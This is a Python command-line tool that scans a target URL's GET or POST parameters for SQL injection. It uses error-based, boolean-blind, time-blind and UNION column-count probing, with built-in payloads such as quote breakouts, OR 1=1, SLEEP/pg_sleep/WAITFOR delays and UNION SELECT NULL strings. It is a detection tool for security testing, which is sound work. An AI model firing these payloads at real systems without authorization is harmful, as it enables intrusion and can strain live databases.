#!/usr/bin/env python3
"""
Project #15 - SQL Injection Detection Tool

Goes beyond Project #10's basic SQLi probing with three dedicated
detection techniques, each looking for a different signal:

  error-based     - injects payloads likely to break SQL syntax, checks
                     the response for known database error signatures
  boolean-based    - sends a TRUE condition and a FALSE condition payload
    (blind)          for the same parameter, compares response length/
                     content; a real difference between them (while a
                     baseline vs TRUE stays similar) is the signal
  time-based       - injects a payload designed to cause the database to
    (blind)          take measurably longer to respond (e.g. a heavy
                     recursive query), and compares elapsed time against
                     a baseline request
  union-based      - determines column count via ORDER BY probing, then
                     confirms exploitability with a matching UNION SELECT
                     (does not attempt actual data extraction)

Supports testing GET query parameters and POST form/JSON body parameters.
Testable end-to-end against any real HTTP target with parameters --
including OWASP Juice Shop (used in Project #10) or a local test app.

SCOPE NOTE: the 'time' and 'union' techniques use numeric-context payloads
(e.g. "1 OR SLEEP(5)", no leading quote), so they work against parameters
injected directly into a numeric SQL context (e.g. WHERE id = {input}).
They will NOT detect injection in string contexts (e.g. WHERE name LIKE
'%{input}%') since the payload never breaks out of the quoted string. The
'error' and 'boolean' techniques DO cover string contexts, since their
payloads open with a quote specifically to break out of one. In practice:
run all four techniques -- between them, both contexts get covered, but
a "clean" result from time/union alone on a string-context parameter is
not a reliable clean bill of health by itself.

Usage:
    python3 sql_injection_detector.py scan -u "http://target/search?q=test"
    python3 sql_injection_detector.py scan -u "http://target/login" -X POST \\
        -d '{"username": "admin", "password": "x"}' --json
    python3 sql_injection_detector.py scan -u "http://target/product?id=1" \\
        --techniques error,boolean,time,union
"""

import argparse
import json
import re
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' AND '1'='2", "';--", "' OR 1=1--",
    "\" OR \"1\"=\"1", "1' ORDER BY 100--",
]

BOOLEAN_TRUE_PAYLOAD = "' OR '1'='1'--"
BOOLEAN_FALSE_PAYLOAD = "' AND '1'='2'--"

# Recursion depth tuned to produce a multi-second delay against SQLite;
# for MySQL/PostgreSQL targets, SLEEP()/pg_sleep() payloads are used instead
# since those functions exist natively there.
TIME_PAYLOADS = {
    "generic_sqlite": "1 OR (SELECT count(*) FROM (WITH RECURSIVE cnt(x) AS "
                       "(SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<12000000) SELECT x FROM cnt))",
    "mysql": "1 OR SLEEP(5)",
    "postgresql": "1 OR pg_sleep(5)",
    "mssql": "1;WAITFOR DELAY '0:0:5'--",
}

TIME_DELAY_THRESHOLD_SECONDS = 1.5  # how much slower than baseline counts as a signal

# Known DB error signatures across common engines
ERROR_SIGNATURES = [
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"Warning.*mysqli", "MySQL"),
    (r"you have an error in your sql syntax", "MySQL"),
    (r"unrecognized token", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"SQLite error", "SQLite"),
    (r"SQLITE_ERROR", "SQLite"),
    (r"SQLITE_[A-Z]+:", "SQLite"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"pg_query\(\)", "PostgreSQL"),
    (r"unterminated quoted string", "PostgreSQL/SQLite"),
    (r"Microsoft SQL Server", "MSSQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"ORA-\d{5}", "Oracle"),
    (r"quoted string not properly terminated", "Oracle"),
    (r"syntax error.{0,20}near", "Generic SQL"),  # broad fallback across drivers/engines
]

_COMPILED_SIGNATURES = [(re.compile(pat, re.IGNORECASE), name) for pat, name in ERROR_SIGNATURES]


# ---------------------------------------------------------------------------
# Parameter extraction
# ---------------------------------------------------------------------------

def extract_get_params(url: str) -> dict:
    parsed = urlparse(url)
    return dict(parse_qsl(parsed.query))


def build_url_with_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    params[param] = value
    new_query = urlencode(params)
    return urlunparse(parsed._replace(query=new_query))


# ---------------------------------------------------------------------------
# Detection techniques
# ---------------------------------------------------------------------------

def _check_error_signatures(text: str):
    for pattern, engine in _COMPILED_SIGNATURES:
        if pattern.search(text):
            return engine
    return None


def test_error_based(session: requests.Session, url: str, method: str, param: str,
                      base_params: dict, is_json: bool) -> list:
    findings = []
    for payload in ERROR_PAYLOADS:
        try:
            resp = _send(session, url, method, param, payload, base_params, is_json)
        except requests.RequestException as e:
            continue
        engine = _check_error_signatures(resp.text)
        if engine:
            findings.append({
                "technique": "error-based",
                "parameter": param,
                "payload": payload,
                "evidence": f"Response contains {engine} error signature",
                "severity": "critical",
            })
            break  # one confirmed error-based hit per parameter is enough
    return findings


def test_boolean_based(session: requests.Session, url: str, method: str, param: str,
                        base_params: dict, is_json: bool) -> list:
    findings = []
    try:
        true_resp = _send(session, url, method, param, BOOLEAN_TRUE_PAYLOAD, base_params, is_json)
        false_resp = _send(session, url, method, param, BOOLEAN_FALSE_PAYLOAD, base_params, is_json)
    except requests.RequestException:
        return findings

    len_diff = abs(len(true_resp.text) - len(false_resp.text))
    status_diff = true_resp.status_code != false_resp.status_code
    content_diff = true_resp.text.strip() != false_resp.text.strip()

    # Signal: TRUE and FALSE payloads produce genuinely different responses.
    # Any status code change, or ANY content difference, counts -- these are
    # two purpose-built payloads compared against each other (not against
    # unrelated noise), so even a 1-byte difference (e.g. "true" vs "false"
    # in a JSON auth response) is meaningful, not noise.
    if status_diff or content_diff:
        findings.append({
            "technique": "boolean-based blind",
            "parameter": param,
            "payload": f"TRUE: {BOOLEAN_TRUE_PAYLOAD} / FALSE: {BOOLEAN_FALSE_PAYLOAD}",
            "evidence": f"TRUE and FALSE payloads produced different responses "
                        f"(status {true_resp.status_code} vs {false_resp.status_code}, "
                        f"length diff {len_diff} bytes)",
            "severity": "high",
        })
    return findings


def test_time_based(session: requests.Session, url: str, method: str, param: str,
                     base_params: dict, is_json: bool, baseline_value: str = "1") -> list:
    findings = []
    try:
        t0 = time.time()
        _send(session, url, method, param, baseline_value, base_params, is_json)
        baseline_time = time.time() - t0
    except requests.RequestException:
        return findings

    for db_name, payload in TIME_PAYLOADS.items():
        try:
            t0 = time.time()
            _send(session, url, method, param, payload, base_params, is_json, timeout=15)
            elapsed = time.time() - t0
        except requests.RequestException:
            continue

        delta = elapsed - baseline_time
        if delta >= TIME_DELAY_THRESHOLD_SECONDS:
            findings.append({
                "technique": "time-based blind",
                "parameter": param,
                "payload": payload,
                "evidence": f"Response took {elapsed:.2f}s vs {baseline_time:.2f}s baseline "
                            f"(+{delta:.2f}s, {db_name} payload)",
                "severity": "critical",
            })
            break  # one confirmed time-based hit per parameter is enough
    return findings


MAX_UNION_COLUMNS = 15


def test_union_based(session: requests.Session, url: str, method: str, param: str,
                      base_params: dict, is_json: bool) -> list:
    """
    Determines whether a UNION-based injection is structurally possible,
    WITHOUT assuming or hardcoding any target's actual table/column names --
    this only confirms the vulnerability exists (and how many columns the
    underlying query has), it does not attempt to extract real data. Actual
    data extraction requires target-specific schema knowledge and is a
    manual follow-up step for a human, not something this tool automates.

    Method: uses ORDER BY N-- to find the query's column count (increasing
    N until the database errors, meaning N exceeds the real column count),
    then confirms with a UNION SELECT NULL,NULL,...  matching that column
    count -- if that returns cleanly (no SQL error) where a deliberately
    wrong column count does NOT, that's strong structural evidence of a
    working UNION injection point.
    """
    findings = []
    column_count = None

    # Step 1: find column count via ORDER BY probing
    last_clean = 0
    for n in range(1, MAX_UNION_COLUMNS + 1):
        payload = f"1 ORDER BY {n}--"
        try:
            resp = _send(session, url, method, param, payload, base_params, is_json)
        except requests.RequestException:
            return findings
        if _check_error_signatures(resp.text):
            break
        last_clean = n
    else:
        # Never errored within our probe range -- can't confidently conclude
        return findings

    if last_clean == 0:
        return findings  # errored even at ORDER BY 1, nothing to build on
    column_count = last_clean

    # Step 2: confirm with a UNION SELECT matching that column count
    nulls_correct = ",".join(["NULL"] * column_count)
    union_payload_correct = f"1 UNION SELECT {nulls_correct}--"
    try:
        resp_correct = _send(session, url, method, param, union_payload_correct, base_params, is_json)
    except requests.RequestException:
        return findings

    # And a deliberately wrong column count, as a control -- should error
    # (or at least differ) if the correct one's cleanliness is meaningful
    nulls_wrong = ",".join(["NULL"] * (column_count + 5))
    union_payload_wrong = f"1 UNION SELECT {nulls_wrong}--"
    try:
        resp_wrong = _send(session, url, method, param, union_payload_wrong, base_params, is_json)
    except requests.RequestException:
        resp_wrong = None

    correct_clean = not _check_error_signatures(resp_correct.text)
    wrong_errors = resp_wrong is not None and bool(_check_error_signatures(resp_wrong.text))

    if correct_clean and wrong_errors:
        findings.append({
            "technique": "union-based",
            "parameter": param,
            "payload": union_payload_correct,
            "evidence": f"Query accepts UNION SELECT with exactly {column_count} column(s) "
                        f"(confirmed via ORDER BY probing); a mismatched column count errors as "
                        f"expected. Structurally exploitable for data extraction -- actual "
                        f"extraction requires manual follow-up with target-specific table/column "
                        f"names, which this tool does not guess or automate.",
            "severity": "critical",
        })
    return findings


def _send(session: requests.Session, url: str, method: str, param: str, value: str,
          base_params: dict, is_json: bool, timeout: int = 10):
    if method.upper() == "GET":
        test_url = build_url_with_param(url, param, value)
        return session.get(test_url, timeout=timeout)
    else:
        payload = dict(base_params)
        payload[param] = value
        if is_json:
            return session.post(url, json=payload, timeout=timeout)
        else:
            return session.post(url, data=payload, timeout=timeout)


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

TECHNIQUES = {
    "error": test_error_based,
    "boolean": test_boolean_based,
    "time": test_time_based,
    "union": test_union_based,
}


def scan(url: str, method: str = "GET", data: dict = None, is_json: bool = False,
          techniques: list = None, quiet: bool = False) -> dict:
    techniques = techniques or list(TECHNIQUES.keys())
    session = requests.Session()

    if method.upper() == "GET":
        params_to_test = extract_get_params(url)
        base_params = {}
    else:
        params_to_test = data or {}
        base_params = data or {}

    if not params_to_test:
        raise ValueError(
            "No parameters found to test. For GET, include query params in the URL "
            "(e.g. ?id=1). For POST, provide -d/--data with at least one field."
        )

    # Verify the target is actually reachable before running any technique.
    # Without this, connection failures get silently swallowed inside each
    # technique's try/except and the tool reports a misleading "0 findings"
    # clean result for a target it never actually managed to scan.
    try:
        if method.upper() == "GET":
            session.get(url, timeout=10)
        else:
            _send(session, url, method, next(iter(params_to_test)),
                  next(iter(params_to_test.values())), base_params, is_json, timeout=10)
    except requests.RequestException as e:
        raise ValueError(f"Could not reach target: {e}")

    all_findings = []
    for param in params_to_test:
        for tech_name in techniques:
            test_fn = TECHNIQUES.get(tech_name)
            if test_fn is None:
                continue
            results = test_fn(session, url, method, param, base_params, is_json)
            all_findings.extend(results)

    result = {
        "url": url,
        "method": method.upper(),
        "timestamp": datetime.now().isoformat(),
        "parameters_tested": list(params_to_test.keys()),
        "techniques_used": techniques,
        "findings_count": len(all_findings),
        "findings": all_findings,
    }

    if not quiet:
        _print_report(result)

    return result


def _print_report(result: dict):
    print(f"[*] Target: {result['method']} {result['url']}")
    print(f"[*] Parameters tested: {', '.join(result['parameters_tested'])}")
    print(f"[*] Techniques: {', '.join(result['techniques_used'])}")
    print(f"[*] Findings: {result['findings_count']}")
    for finding in result["findings"]:
        print(f"\n  [{finding['severity'].upper()}] {finding['technique']} on parameter '{finding['parameter']}'")
        print(f"      payload: {finding['payload']}")
        print(f"      evidence: {finding['evidence']}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("-q", "--quiet", action="store_true", help="Suppress console output")

    parser = argparse.ArgumentParser(description="SQL Injection Detection Tool (Project #15)", parents=[common])
    sub = parser.add_subparsers(dest="command", required=True)

    p_scan = sub.add_parser("scan", help="Scan a URL/endpoint for SQL injection", parents=[common])
    p_scan.add_argument("-u", "--url", required=True, help="Target URL (include GET params directly in the URL)")
    p_scan.add_argument("-X", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    p_scan.add_argument("-d", "--data", help="POST body as JSON string, e.g. '{\"username\":\"admin\",\"password\":\"x\"}'")
    p_scan.add_argument("--json", action="store_true", help="Send POST data as JSON (default: form-encoded)")
    p_scan.add_argument("--techniques", default="error,boolean,time,union",
                         help="Comma-separated techniques to run: error,boolean,time,union (default: all)")
    p_scan.add_argument("-o", "--output", help="Write JSON report to this file")

    args = parser.parse_args()

    try:
        if args.command == "scan":
            data = None
            if args.data:
                try:
                    data = json.loads(args.data)
                except json.JSONDecodeError as e:
                    print(f"[!] --data must be valid JSON: {e}", file=sys.stderr)
                    sys.exit(1)

            if args.method == "POST" and not data:
                print("[!] POST requires -d/--data with at least one field.", file=sys.stderr)
                sys.exit(1)

            techniques = [t.strip().lower() for t in args.techniques.split(",") if t.strip()]
            unknown = [t for t in techniques if t not in TECHNIQUES]
            if unknown:
                print(f"[!] Unknown technique(s): {', '.join(unknown)}. Valid: {', '.join(TECHNIQUES)}", file=sys.stderr)
                sys.exit(1)

            result = scan(args.url, method=args.method, data=data, is_json=args.json,
                          techniques=techniques, quiet=args.quiet)

            if args.output:
                Path(args.output).write_text(json.dumps(result, indent=2))
                if not args.quiet:
                    print(f"\n[+] Report written to {args.output}")

            if result["findings_count"] > 0:
                sys.exit(2)

    except ValueError as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
